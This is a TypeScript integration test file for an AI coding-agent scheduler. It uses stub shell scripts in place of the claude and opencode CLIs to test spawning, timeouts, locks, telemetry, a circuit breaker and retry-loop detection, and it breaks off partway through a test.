// The scheduler's REAL (non --dry-run) execution path — previously 0% covered: every existing
// run-agents test passes --dry-run, so the spawn/env/log/timeout/drain/lock machinery that spends
// real API tokens in production never executed under test. A stub `claude` on DEVLOOP_CLAUDE_BIN
// stands in for the CLI: it records its env + argv, optionally sleeps, and marks completion.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawnSync, execFileSync, spawn } from "node:child_process";
import { chmodSync, mkdirSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { fileURLToPath } from "node:url";
import { RETRY_LOOP_LINE_WINDOW } from "../src/seen-lines.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const repoRoot = resolve(hubRoot, "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = mkdtempSync(join(tmpdir(), "dl-run-live-"));
try {
  const data = join(tmp, "data");
  const repo = join(tmp, "repo");
  const stubOut = join(tmp, "stub-out");
  for (const d of [data, repo, stubOut]) mkdirSync(d, { recursive: true });
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { demo: { repoPath: repo } } }));

  const stub = join(tmp, "stub-claude");
  writeFileSync(stub, `#!/bin/sh
rec="$STUB_OUT/rec-$$.txt"
{ echo "ACTOR=$DEVLOOP_ACTOR"; echo "PROJECT=$DEVLOOP_PROJECT"; echo "SPLIT=$DEVLOOP_DEV_SPLIT"; echo "NARGS=$#"; } > "$rec"
[ -n "$STUB_SLEEP" ] && sleep "$STUB_SLEEP"
echo "COMPLETED" >> "$rec"
exit 0
`);
  chmodSync(stub, 0o755);

  const common = ["--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub.db"), "--project", "demo", "--cwd", repo, "--cli", "claude", "--agents", "pm"];
  const runLive = (args: string[], env: Record<string, string> = {}, timeout = 90_000) => {
    const r = spawnSync("node", ["src/run-agents.ts", ...args], {
      cwd: hubRoot, encoding: "utf8", timeout,
      env: { ...process.env, DEVLOOP_CLAUDE_BIN: stub, STUB_OUT: stubOut, DEVLOOP_RUN_DIR: tmp, ...env },
    });
    return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
  };
  const recs = () => readdirSync(stubOut).filter((f) => f.startsWith("rec-")).map((f) => readFileSync(join(stubOut, f), "utf8"));
  const clearRecs = () => { for (const f of readdirSync(stubOut)) rmSync(join(stubOut, f)); };

  // ── 1. --once real fire: the stub actually spawns and receives per-fire identity env ──
  const once = runLive(["--once", ...common]);
  const r1 = recs();
  ok(once.code === 0, `--once real fire exits 0 (got ${once.code})`);
  ok(r1.length === 1 && /ACTOR=pm\n/.test(r1[0]) && /PROJECT=demo\n/.test(r1[0]),
    "the spawned CLI received DEVLOOP_ACTOR=pm + DEVLOOP_PROJECT=demo in its env");
  ok(r1.length === 1 && /COMPLETED/.test(r1[0]), "the fire ran to completion");
  ok(existsSync(join(data, "demo", "runner-logs", "pm.log")), "per-agent runner log was written");
  // Stream-lifecycle regression (field report P2-4, ×103): the stub prints nothing + exits 0, i.e. the
  // suspectError path — finalize's footer/suspect writes used to land on a stream the close handler had
  // already ended, losing the file tail of every fire as "write after end".
  ok(!/write after end/.test(once.out), "no 'runner-log write failed (write after end)' — finalize owns the stream end");
  const pmLog = readFileSync(join(data, "demo", "runner-logs", "pm.log"), "utf8");
  ok(/===== exit code=0/.test(pmLog), "the exit footer reaches the log file (used to be lost after end)");
  ok(/===== suspectError:/.test(pmLog), "the suspectError marker reaches the log file (used to be lost after end)");
  clearRecs();

  // ── 2. --max-fires drain: the Nth fire COMPLETES (the old stop() SIGINT'd the fire it just launched) ──
  const drain = runLive(["--max-fires", "1", "--stagger", "0", ...common], { STUB_SLEEP: "2" });
  const r2 = recs();
  ok(drain.code === 0 && /draining active fires/.test(drain.out), `--max-fires drains and exits 0 (got ${drain.code})`);
  ok(r2.length === 1 && /COMPLETED/.test(r2[0]),
    "the in-flight fire ran to completion during drain (was: SIGINT'd milliseconds after launch)");
  clearRecs();

  // ── 3. fire timeout: a wedged child is SIGTERM'd, the slot recovers, the loop exits by drain ──
  const t0 = Date.now();
  const timeoutRun = runLive(["--max-fires", "1", "--stagger", "0", "--fire-timeout", "1s", ...common], { STUB_SLEEP: "600" }, 60_000);
  const r3 = recs();
  ok(/fire exceeded 1s — SIGTERM/.test(timeoutRun.out), "a wedged fire logs the timeout escalation");
  ok(r3.length === 1 && !/COMPLETED/.test(r3[0]), "the wedged child was actually killed (no completion marker)");
  ok(Date.now() - t0 < 30_000, "the timeout path completes promptly (slot is not held for the child's full sleep)");
  clearRecs();

  // ── 4. run lock: a live holder blocks a second scheduler; a stale lock is taken over ──
  writeFileSync(join(tmp, "run-demo.lock"), JSON.stringify({ pid: process.pid, startedAt: "now" })); // alive: this test process
  const locked = runLive(["--max-fires", "1", "--stagger", "0", ...common]);
  ok(locked.code === 2 && /already running \(pid/.test(locked.out),
    "a second `dev-loop run` for the same project refuses to start while the lock holder is alive");
  writeFileSync(join(tmp, "run-demo.lock"), JSON.stringify({ pid: 99999999, startedAt: "then" })); // dead pid: stale
  const stale = runLive(["--max-fires", "1", "--stagger", "0", ...common]);
  ok(stale.code === 0 && /taking over stale run lock/.test(stale.out),
    "a stale lock (dead pid) is taken over and the run proceeds");
  ok(!existsSync(join(tmp, "run-demo.lock")), "the lock is released on exit");

  // ── 5. P1 telemetry: a real fire against a HUB-SEEDED project writes a fire.completed event ──
  const hubDb = join(tmp, "hub2.db");
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { tel: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "tel", "Tel Project", "TELX", hubDb], { cwd: hubRoot, encoding: "utf8" });
  const telCommon = ["--root", repoRoot, "--data", data, "--hub-db", hubDb, "--project", "tel", "--cwd", repo, "--cli", "claude", "--agents", "sweep", "--once"];
  const tel = runLive(telCommon);
  ok(tel.code === 0, `telemetry fire exits 0 (got ${tel.code})`);
  const rows = execFileSync("node", ["--input-type=module", "-e",
    `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${hubDb}'); const pid=findProject(db,'tel'); const r=db.prepare("SELECT actor,data FROM events WHERE project_id=? AND kind='fire.completed'").all(pid); process.stdout.write(JSON.stringify(r));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const events = JSON.parse(rows) as { actor: string; data: string }[];
  ok(events.length === 1 && events[0].actor === "sweep", "P1: one fire.completed event, attributed to the fired agent");
  const d = events.length ? JSON.parse(events[0].data) as Record<string, unknown> : {};
  ok(d.codingAgent === "claude" && typeof d.durationMs === "number" && d.exitCode === 0 && d.timedOut === false,
    "P1: fire.completed carries codingAgent + durationMs + exitCode + timedOut");
  // LOOP-58 (was covered by run-agents.ts's now-removed recordFire import): the fire.completed event carries
  // the per-fire UUID fireId, asserted here on a REAL fire rather than a direct recordFire() call.
  ok(typeof d.fireId === "string" && /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/.test(d.fireId as string),
    `LOOP-58: fire.completed event carries the per-fire UUID fireId (got ${JSON.stringify(d.fireId)})`);

  // ── 5b. P0-1b errorClass: a spend-limit-shaped failure is classified in the ledger/event ──
  const stubFail = join(tmp, "stub-claude-fail");
  writeFileSync(stubFail, `#!/bin/sh
echo "You've hit your monthly spend limit · raise it at claude.ai/settings/usage" >&2
exit 1
`);
  chmodSync(stubFail, 0o755);
  const telFail = runLive(telCommon, { DEVLOOP_CLAUDE_BIN: stubFail });
  ok(telFail.code === 1, `spend-limit fire propagates exit 1 (got ${telFail.code})`);
  const rows2 = execFileSync("node", ["--input-type=module", "-e",
    `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${hubDb}'); const pid=findProject(db,'tel'); const r=db.prepare("SELECT data FROM events WHERE project_id=? AND kind='fire.completed'").all(pid); process.stdout.write(JSON.stringify(r));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const datas = (JSON.parse(rows2) as { data: string }[]).map((r) => JSON.parse(r.data) as Record<string, unknown>);
  ok(datas.some((x) => x.errorClass === "spend-limit" && x.exitCode === 1),
    "P0-1b: the spend-limit failure carries errorClass:'spend-limit' in fire.completed");

  // ── 5c. P0-1a breaker: 3 identical failures trip to probe cadence; the first success closes ──
  // A counter stub fails with the SAME spend-limit line for runs 1-3, succeeds from run 4 — the exact
  // field shape (identical fast failures) followed by recovery (limit reset). Timeline @1s cadence,
  // probe 3s, max-fires 6: f1..f3 fail → OPEN → one probe wait → f4 succeeds → CLOSED → f5,f6 normal.
  const cnt = join(tmp, "flaky-count");
  const stubFlaky = join(tmp, "stub-claude-flaky");
  writeFileSync(stubFlaky, `#!/bin/sh
n=$(cat "$CNT_FILE" 2>/dev/null || echo 0); n=$((n+1)); printf '%s' "$n" > "$CNT_FILE"
if [ "$n" -le 3 ]; then echo "You've hit your monthly spend limit · raise it at claude.ai/settings/usage" >&2; exit 1; fi
echo "recovered run $n"
exit 0
`);
  chmodSync(stubFlaky, 0o755);
  const bt0 = Date.now();
  const brk = runLive([
    "--root", repoRoot, "--data", data, "--hub-db", join(tmp, "hub4.db"), "--project", "demo", "--cwd", repo,
    "--cli", "claude", "--agents", "sweep", "--interval", "sweep=1s", "--stagger", "0",
    "--breaker", "3", "--breaker-probe", "3s", "--max-fires", "6",
  ], { DEVLOOP_CLAUDE_BIN: stubFlaky, CNT_FILE: cnt }, 120_000);
  const openIdx = brk.out.indexOf("breaker OPEN: sweep");
  const closeIdx = brk.out.indexOf("breaker CLOSED: sweep");
  ok(openIdx >= 0 && /3× identical failures \(.*spend-limit.*\)/.test(brk.out), "P0-1a: 3 identical spend-limit failures trip the breaker (keyed on errorClass)");
  ok(closeIdx > openIdx, "P0-1a: the first successful probe fire closes the breaker (recovery notice after the open)");
  ok(readFileSync(cnt, "utf8") === "6", `P0-1a: all 6 fires ran — the breaker paces, it never strands the slot (got ${readFileSync(cnt, "utf8")})`);
  ok(brk.out.split("breaker OPEN").length === 2 && brk.out.split("breaker CLOSED").length === 2, "P0-1a: trip and recovery notify exactly ONCE each");
  ok(Date.now() - bt0 >= 3_000, "P0-1a: the probe wait actually elapsed (open slot ran slower than base cadence)");

  // ── 7. Process-group kill: a watchdog kill reaps all descendants, not just the direct child ──
  // The stub spawns a long-sleeping grandchild and writes its PID to a file.  After the fire-timeout
  // watchdog fires (and with detached:true signals the whole process group), the grandchild must be dead.
  const gcPidFile = join(tmp, "grandchild-pid");
  const stubGrandchild = join(tmp, "stub-grandchild");
  writeFileSync(stubGrandchild, `#!/bin/sh
sleep 600 &
echo $! > "$GRANDCHILD_PID_FILE"
echo "grandchild spawned"
sleep 600
`);
  chmodSync(stubGrandchild, 0o755);
  const gcRun = runLive(["--max-fires", "1", "--stagger", "0", "--fire-timeout", "2s", ...common],
    { DEVLOOP_CLAUDE_BIN: stubGrandchild, GRANDCHILD_PID_FILE: gcPidFile }, 30_000);
  const gcPid = existsSync(gcPidFile) ? readFileSync(gcPidFile, "utf8").trim() : "";
  ok(gcPid !== "", "grandchild stub wrote its PID");
  const gcAlive = spawnSync("kill", ["-0", gcPid]).status;
  ok(gcAlive !== 0, `grandchild (pid ${gcPid}) was reaped by the process-group kill`);

  // ── 8. Scheduler survives the group kill (it is NOT in the child's process group) ──
  // The fire-timeout run above proves it: if SIGTERM/SIGKILL had hit the scheduler, it would have
  // exited with a signal (code null), not code 0.
  ok(gcRun.code === 0, `scheduler survived the group kill of its fire (exit ${gcRun.code})`);

  // ── 9. Retry-loop detection: output keeps arriving but no NEW content → errorClass "retry-loop" ──
  // A stub that prints the same line every 0.5 s simulates a 429 retry loop that keeps the silence
  // watchdog from tripping. The liveness watchdog should detect the lack of new content and kill the
  // fire with errorClass "retry-loop" (not "stalled").
  const retryDb = join(tmp, "hub-retry.db");
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { tel: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "tel", "Tel Project", "TELX", retryDb], { cwd: hubRoot, encoding: "utf8" });
  const stubRetry = join(tmp, "stub-retry-loop");
  writeFileSync(stubRetry, `#!/bin/sh
while true; do
  echo "rate limit exceeded, retrying in 2s..."
  sleep 0.5
done
`);
  chmodSync(stubRetry, 0o755);
  const retryCommon = ["--root", repoRoot, "--data", data, "--hub-db", retryDb, "--project", "tel", "--cwd", repo, "--cli", "claude", "--agents", "sweep", "--once"];
  const retryRun = runLive([...retryCommon, "--stall-timeout", "3s"], { DEVLOOP_CLAUDE_BIN: stubRetry }, 60_000);
  ok(/retry-loop/.test(retryRun.out), "retry-loop watchdog fires when output keeps arriving but contains no new content");
  ok(!/stalled/.test(retryRun.out.replace(/silent retry loop/, "")), "retry-loop case does NOT report 'stalled' (distinct classification)");
  // Verify the errorClass reaches the fire ledger
  const retryRows = execFileSync("node", ["--input-type=module", "-e",
    `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${retryDb}'); const pid=findProject(db,'tel'); const r=db.prepare("SELECT data FROM events WHERE project_id=? AND kind='fire.completed'").all(pid); process.stdout.write(JSON.stringify(r));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const retryData = (JSON.parse(retryRows) as { data: string }[]).map((r) => JSON.parse(r.data) as Record<string, unknown>);
  ok(retryData.some((x) => x.errorClass === "retry-loop"), "retry-loop errorClass reaches the fire.completed ledger event");
  // Verify fireMetrics still parses retry-loop in byErrorClass — it is a free-form string dimension, so
  // no code change is needed; this assertion guards against a future whitelist regression.
  const metricsLedger = join(tmp, "fires-retry.jsonl");
  writeFileSync(metricsLedger, JSON.stringify({ ts: new Date().toISOString(), agent: "sweep", project: "tel", exitCode: 125, timedOut: false, errorClass: "retry-loop", durationMs: 5000 }) + "\n");
  const metricsOut = execFileSync("node", ["--input-type=module", "-e",
    `import {fireMetrics} from './src/metrics.ts'; process.stdout.write(JSON.stringify(fireMetrics('${metricsLedger}', 86400000)));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const metricsJson = JSON.parse(metricsOut) as { byErrorClass?: Record<string, number> };
  ok(typeof metricsJson.byErrorClass?.["retry-loop"] === "number",
    "retry-loop appears under byErrorClass in fireMetrics (free-form dimension — dev-loop metrics --json still parses)");

  // ── 10. Retry-loop detection survives a SATURATED line set (LOOP-23 regression) ──
  // Test 9 proves the mechanism from the first byte (the seen-set never fills). This proves the
  // REQUIREMENT: a fire that first streams far more distinct lines than the detector's window bound,
  // THEN enters a repeating loop, is STILL killed with errorClass "retry-loop". Against PR #27's
  // frozen-at-200 Set the loop's line is never in the frozen prefix, so every repeat counts as new
  // content and the fire is never killed — it hits the fire-timeout instead — so this test FAILS on
  // #27 (the regression proof); against the rolling window it trips at the first stall check (~15s).
  const satDb = join(tmp, "hub-saturated.db");
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { sat: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "sat", "Saturated Project", "SATX", satDb], { cwd: hubRoot, encoding: "utf8" });
  const distinctBeforeLoop = RETRY_LOOP_LINE_WINDOW * 3 + 50; // ≥ 3× the window bound, per the AC
  const stubSaturate = join(tmp, "stub-saturated-loop");
  writeFileSync(stubSaturate, `#!/bin/sh
i=0
while [ $i -lt ${distinctBeforeLoop} ]; do echo "distinct startup tool line $i saturating the window"; i=$((i+1)); done
while true; do
  echo "rate limit exceeded, retrying in 2s..."
  sleep 0.5
done
`);
  chmodSync(stubSaturate, 0o755);
  const satCommon = ["--root", repoRoot, "--data", data, "--hub-db", satDb, "--project", "sat", "--cwd", repo, "--cli", "claude", "--agents", "sweep", "--once"];
  // --fire-timeout caps the #27 regression case so it exits at 30s instead of hanging; the rolling
  // window trips the retry-loop watchdog well before that (first stall check ~15s).
  const satRun = runLive([...satCommon, "--stall-timeout", "3s", "--fire-timeout", "30s"], { DEVLOOP_CLAUDE_BIN: stubSaturate }, 60_000);
  ok(/retry-loop/.test(satRun.out), "retry-loop is detected AFTER the seen-line window saturated (the frozen-200 detector missed this)");
  const satRows = execFileSync("node", ["--input-type=module", "-e",
    `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${satDb}'); const pid=findProject(db,'sat'); const r=db.prepare("SELECT data FROM events WHERE project_id=? AND kind='fire.completed'").all(pid); process.stdout.write(JSON.stringify(r));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const satData = (JSON.parse(satRows) as { data: string }[]).map((r) => JSON.parse(r.data) as Record<string, unknown>);
  ok(satData.some((x) => x.errorClass === "retry-loop"), "the saturated-then-looping fire records errorClass \"retry-loop\" in the ledger");

  // ── 11. No false positive: genuinely-new content then quiet trips "stalled", never "retry-loop" ──
  // The rolling window must never turn slow-but-healthy output into a false loop. A fire that emits
  // genuinely-new distinct lines and then goes silent must classify as "stalled" (silence), never
  // "retry-loop": `looping` requires !silent, so once output stops the watchdog sees silence, not a loop.
  const slowDb = join(tmp, "hub-slow.db");
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { slow: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "slow", "Slow Project", "SLOWX", slowDb], { cwd: hubRoot, encoding: "utf8" });
  const stubSlow = join(tmp, "stub-slow-healthy");
  writeFileSync(stubSlow, `#!/bin/sh
i=0
while [ $i -lt 5 ]; do echo "healthy progress step $i (genuinely new content)"; i=$((i+1)); sleep 0.3; done
sleep 600
`);
  chmodSync(stubSlow, 0o755);
  const slowCommon = ["--root", repoRoot, "--data", data, "--hub-db", slowDb, "--project", "slow", "--cwd", repo, "--cli", "claude", "--agents", "sweep", "--once"];
  const slowRun = runLive([...slowCommon, "--stall-timeout", "3s"], { DEVLOOP_CLAUDE_BIN: stubSlow }, 60_000);
  ok(/stalled/.test(slowRun.out) && !/retry-loop/.test(slowRun.out.replace(/silent retry loop/g, "")),
    "genuinely-new-then-quiet fire classifies as stalled, never retry-loop");
  const slowRows = execFileSync("node", ["--input-type=module", "-e",
    `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${slowDb}'); const pid=findProject(db,'slow'); const r=db.prepare("SELECT data FROM events WHERE project_id=? AND kind='fire.completed'").all(pid); process.stdout.write(JSON.stringify(r));`],
    { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
  const slowData = (JSON.parse(slowRows) as { data: string }[]).map((r) => JSON.parse(r.data) as Record<string, unknown>);
  ok(slowData.some((x) => x.errorClass === "stalled") && !slowData.some((x) => x.errorClass === "retry-loop"),
    "the slow-but-healthy fire records \"stalled\", never \"retry-loop\"");

  // ── 6. R1 change-gate: on a quiet board, a gated agent fires ONCE then skips (no re-spawn) ──
  const gateDb = join(tmp, "hub3.db");
  const gateData = join(tmp, "gate-data"); const gateOut = join(tmp, "gate-out");
  mkdirSync(gateData, { recursive: true }); mkdirSync(gateOut, { recursive: true });
  writeFileSync(join(gateData, "projects.json"), JSON.stringify({ projects: { gate: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "gate", "Gate Project", "GATEX", gateDb], { cwd: hubRoot, encoding: "utf8" });
  // LOOP-32: the interval is now a parameter (default 1s) so gated tests can use 3s to eliminate the
  // startup-race: with 1s interval, if Node startup exceeds 1s the 2nd tick fires before the gate state
  // is written from fire 1 (intermittent on loaded CI / Node 23.6.0). At 3s there is >2s margin.
  // LOOP-32: DEVLOOP_PROJECTS_JSON is explicitly pinned to the test's projects.json so a dev-loop session
  // environment (where DEVLOOP_PROJECTS_JSON points to the real workspace) can't override readProjects().
  // Without this, backend comes back undefined (gate project not in real config) → gateActive=false.
  const runLoop = (extra: string[], outDir: string, sleepSec: string, agent = "pm", interval = "1s"): number => {
    const child = spawn("node", ["src/run-agents.ts", "--root", repoRoot, "--data", gateData, "--hub-db", gateDb, "--project", "gate", "--cwd", repo, "--cli", "claude", "--agents", agent, "--interval", `${agent}=${interval}`, "--stagger", "0", ...extra],
      { cwd: hubRoot, stdio: "ignore", env: { ...process.env, DEVLOOP_CLAUDE_BIN: stub, STUB_OUT: outDir, DEVLOOP_RUN_DIR: tmp, DEVLOOP_PROJECTS_JSON: join(gateData, "projects.json") } });
    spawnSync("sleep", [sleepSec]);          // let it tick for the window
    child.kill("SIGTERM");
    spawnSync("sleep", ["1"]);               // let it drain/exit
    try { child.kill("SIGKILL"); } catch { /* already gone */ }
    return readdirSync(outDir).filter((f) => f.startsWith("rec-")).length;
  };
  const gatedFires = runLoop(["--change-gate"], gateOut, "4.2", "pm", "3s");
  ok(gatedFires === 1, `change-gate: pm fires once then skips on a quiet board (fired ${gatedFires}× @3s interval)`);
  const openOut = join(tmp, "open-out"); mkdirSync(openOut, { recursive: true });
  try { rmSync(join(gateData, "gate", "scheduler-gate.json")); } catch { /* fresh */ }
  // LOOP-32: use --max-fires 3 so the loop exits after exactly 3 fires (deterministic); the old
  // wall-clock window ("6.5s") was fragile on loaded CI — startup overhead on Node 23.6.0 caused
  // only 2 fires to fit, failing the >= 3 assertion intermittently.
  spawnSync("node", ["src/run-agents.ts", "--root", repoRoot, "--data", gateData, "--hub-db", gateDb, "--project", "gate", "--cwd", repo, "--cli", "claude", "--agents", "pm", "--interval", "pm=1s", "--stagger", "0", "--max-fires", "3"],
    { cwd: hubRoot, stdio: "ignore", timeout: 30_000, env: { ...process.env, DEVLOOP_CLAUDE_BIN: stub, STUB_OUT: openOut, DEVLOOP_RUN_DIR: tmp, DEVLOOP_PROJECTS_JSON: join(gateData, "projects.json") } });
  const ungatedFires = readdirSync(openOut).filter((f) => f.startsWith("rec-")).length;
  ok(ungatedFires === 3, `no gate: pm fires on every tick (exactly ${ungatedFires}/3 with --max-fires 3)`);

  // ── 6a. R1a review-tier TTL: pm/qa do their best work on a QUIET board (lens rotation / coverage
  //    expansion), so an unchanged key only DEFERS them — once the quiet-board TTL elapses since the
  //    last fire, the gate lets ONE through, which re-arms it. dev tier keeps the pure gate. ──
  const gateFile = join(gateData, "gate", "scheduler-gate.json");
  const seedOut = join(tmp, "seed-out"); mkdirSync(seedOut, { recursive: true });
  runLoop(["--change-gate"], seedOut, "4.2", "pm", "3s");        // re-seed pm gate state (deleted above); 4.2s window ensures the 3s-interval tick fires and writes the gate file
  {
    const st = JSON.parse(readFileSync(gateFile, "utf8")) as Record<string, { key: string; firedAt: number }>;
    ok(typeof st.pm === "object" && typeof st.pm.key === "string" && typeof st.pm.firedAt === "number",
      "gate state records the change-key + firedAt (the R1a TTL anchor)");
    st.pm.firedAt = Date.now() - 5 * 60 * 60_000;              // past the default 4h TTL; the board stays quiet
    writeFileSync(gateFile, JSON.stringify(st));
  }
  const ttlOut = join(tmp, "ttl-out"); mkdirSync(ttlOut, { recursive: true });
  const ttlFires = runLoop(["--change-gate"], ttlOut, "4.2", "pm", "3s");
  ok(ttlFires === 1, `change-gate TTL: a pm past the quiet-board TTL fires ONCE then re-arms (fired ${ttlFires}×)`);

  // ── 6b. legacy state (pre-TTL bare key string) reads as firedAt:0 ⇒ the next pm review fire runs ──
  {
    const st = JSON.parse(readFileSync(gateFile, "utf8")) as Record<string, { key: string; firedAt: number }>;
    writeFileSync(gateFile, JSON.stringify({ pm: st.pm.key }));  // the pre-TTL on-disk shape
  }
  const legacyOut = join(tmp, "legacy-out"); mkdirSync(legacyOut, { recursive: true });
  const legacyFires = runLoop(["--change-gate"], legacyOut, "4.2", "pm", "3s");
  ok(legacyFires === 1, `change-gate TTL: a pre-TTL bare-string gate state lets the next pm fire run (fired ${legacyFires}×)`);

  // ── 6c. --change-gate-ttl 0 = defer forever: the pure gate applies to pm too ──
  {
    const st = JSON.parse(readFileSync(gateFile, "utf8")) as Record<string, { key: string; firedAt: number }>;
    st.pm.firedAt = Date.now() - 5 * 60 * 60_000;
    writeFileSync(gateFile, JSON.stringify(st));
  }
  const ttl0Out = join(tmp, "ttl0-out"); mkdirSync(ttl0Out, { recursive: true });
  const ttl0Fires = runLoop(["--change-gate", "--change-gate-ttl", "0"], ttl0Out, "4.2", "pm", "3s");
  ok(ttl0Fires === 0, `--change-gate-ttl 0 keeps the pure gate for pm (fired ${ttl0Fires}×, expected 0)`);

  // ── 6d. the dev tier keeps the PURE gate: an aged senior-dev entry still skips ──
  const sdSeedOut = join(tmp, "sd-seed-out"); mkdirSync(sdSeedOut, { recursive: true });
  const sdSeed = runLoop(["--change-gate"], sdSeedOut, "4.2", "senior-dev", "3s");
  ok(sdSeed === 1, `senior-dev under the gate fires once on first run (fired ${sdSeed}×)`);
  {
    const st = JSON.parse(readFileSync(gateFile, "utf8")) as Record<string, { key: string; firedAt: number }>;
    st["senior-dev"].firedAt = Date.now() - 5 * 60 * 60_000;    // aged far past the TTL — must NOT matter
    writeFileSync(gateFile, JSON.stringify(st));
  }
  const sdOut = join(tmp, "sd-out"); mkdirSync(sdOut, { recursive: true });
  const sdFires = runLoop(["--change-gate"], sdOut, "4.2", "senior-dev", "3s");
  ok(sdFires === 0, `the dev tier keeps the PURE gate — an aged senior-dev entry still skips (fired ${sdFires}×, expected 0)`);

  // ── 7. LOOP-85: the opencode lane END-TO-END on a REAL fire (a stub `opencode` streaming JSONL). The two
  //    defects the ticket escalated are structural, so only a real fire proves them: (a) operator-visible
  //    output SURVIVES — opencode STREAMS its --format json events, and because opencodeAdapter has no
  //    resultText the runner never defers the echo, so the readable lines reach console + run.log as they
  //    arrive (LOOP-14 routed opencode into the structured branch and suppressed the whole stream); (b) the
  //    tail-regex suspectError fallback is KEPT, additive to the adapter's structured isError. ──
  const ocStub = join(tmp, "stub-opencode");
  const ocDb = join(tmp, "hub-oc.db");
  writeFileSync(join(data, "projects.json"), JSON.stringify({ projects: { oc: { repoPath: repo, backend: "service" } } }));
  execFileSync("node", ["src/seed.ts", "oc", "OC Project", "OCX", ocDb], { cwd: hubRoot, encoding: "utf8" });
  const ocCommon = ["--root", repoRoot, "--data", data, "--hub-db", ocDb, "--project", "oc", "--cwd", repo, "--cli", "opencode", "--agents", "sweep", "--once"];
  const ocSweepLog = join(data, "oc", "runner-logs", "sweep.log");
  const latestFireData = (): Record<string, unknown> => {
    const rows = execFileSync("node", ["--input-type=module", "-e",
      `import {openDb} from './src/db.ts'; import {findProject} from './src/seed.ts'; const db=openDb('${ocDb}'); const pid=findProject(db,'oc'); const r=db.prepare("SELECT data FROM events WHERE project_id=? AND kind='fire.completed' ORDER BY rowid DESC LIMIT 1").all(pid); process.stdout.write(JSON.stringify(r));`],
      { cwd: hubRoot, encoding: "utf8", env: { ...process.env } });
    const arr = JSON.parse(rows) as { data: string }[];
    return arr.length ? (JSON.parse(arr[0].data) as Record<string, unknown>) : {};
  };
  const ocFire = (body: string) => {
    writeFileSync(ocStub, `#!/bin/sh\n${body}\n`);
    chmodSync(ocStub, 0o755);
    rmSync(ocSweepLog, { force: true }); // fresh log per fire — the output-survival assertion reads only THIS fire
    const run = runLive(ocCommon, { DEVLOOP_OPENCODE_BIN: ocStub });
    return { run, data: latestFireData(), log: existsSync(ocSweepLog) ? readFileSync(ocSweepLog, "utf8") : "" };
  };

  // 7a. happy multi-line JSONL fire: output survives (console + run.log) AND usage is captured from part.tokens.
  const happy = ocFire([
    `echo '{"type":"step_start","part":{"type":"step-start"}}'`,
    `echo '{"type":"text","part":{"type":"text","text":"hello from opencode."}}'`,
    `echo '{"type":"step_finish","part":{"type":"step-finish","cost":0,"tokens":{"total":123,"input":111,"output":12,"cache":{"read":4,"write":2}}}}'`,
    `exit 0`,
  ].join("\n"));
  ok(happy.run.code === 0, `LOOP-85: opencode --format json fire exits 0 (got ${happy.run.code})`);
  ok(/hello from opencode\./.test(happy.run.out), "LOOP-85 AC: the readable line activity reaches the CONSOLE echo live (stream not suppressed)");
  ok(/hello from opencode\./.test(happy.log) && /step_finish/.test(happy.log), "LOOP-85 AC: the JSONL line activity reaches run.log (multi-line buffer) — output survives on the JSONL lane");
  ok(happy.data.codingAgent === "opencode", "LOOP-85: fire.completed attributes the opencode lane");
  {
    const u = happy.data.usage as Record<string, unknown> | undefined;
    ok(!!u && u.source === "provider" && u.inputTokens === 111 && u.outputTokens === 12, "LOOP-85 AC: fire.completed.usage captured end-to-end from the real JSONL stream (input 111 / output 12)");
    ok(!!u && u.cacheReadTokens === 4 && u.cacheWriteTokens === 2 && u.costUsd === 0 && u.currency === "USD", "LOOP-85 AC: cache split + cost captured from part.tokens.cache / part.cost");
    ok(!happy.data.suspectError, "LOOP-85: a healthy opencode fire is NOT flagged suspectError (no false positive)");
  }

  // 7b. TRUNCATED stream: the final usage line is cut mid-JSON. Earlier readable output STILL survives in
  //     run.log, usage degrades to null (honest miss, never a partial row), and the fire does not crash.
  const truncated = ocFire([
    `echo '{"type":"text","part":{"type":"text","text":"line one visible"}}'`,
    `printf '{"type":"step_finish","part":{"tokens":{"inp'`,
    `exit 0`,
  ].join("\n"));
  ok(truncated.run.code === 0, "LOOP-85 AC: a truncated-stream fire still exits normally (parse is best-effort, non-fatal)");
  ok(/line one visible/.test(truncated.log), "LOOP-85 AC: on a TRUNCATED buffer the earlier readable lines still survive in run.log");
  ok(truncated.data.usage === undefined, "LOOP-85 AC: a truncated usage line → NO usage field (honest miss, not a partial/wrong row)");

  // 7c. suspectError fallback KEPT: exit-0 opencode fire printing "Execution error" → flagged via the
  //     tail-regex (NOT the adapter's isError — that owns only the structured signal). This is the exact
  //     regression the ticket escalated: LOOP-14's wiring replaced the tail-regex, so this recorded healthy.
  const execErr = ocFire(`echo 'Execution error'\nexit 0`);
